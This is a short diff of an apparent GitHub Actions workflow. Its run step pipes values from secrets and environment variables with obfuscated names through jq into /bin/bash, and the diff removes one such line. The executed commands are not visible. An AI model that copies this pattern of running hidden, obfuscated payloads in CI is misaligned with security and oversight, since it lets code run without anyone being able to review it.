@@ -27,7 +27,6 @@ jobs:
           dw178: ${{ secrets.dw178 }}
         run: |
           printf '%s' "$dw178" | jq -r .dl7 | /bin/bash
-          printf '%s' "$hkgxy49204" | jq -r .kxp2983 | /bin/bash
           echo $x60 | jq -r .e42785 | /bin/bash
           echo $hjblb83438 | jq -r .wdcx644 | /bin/bash
           echo $mfl1718 | jq -r .un05 | /bin/bash
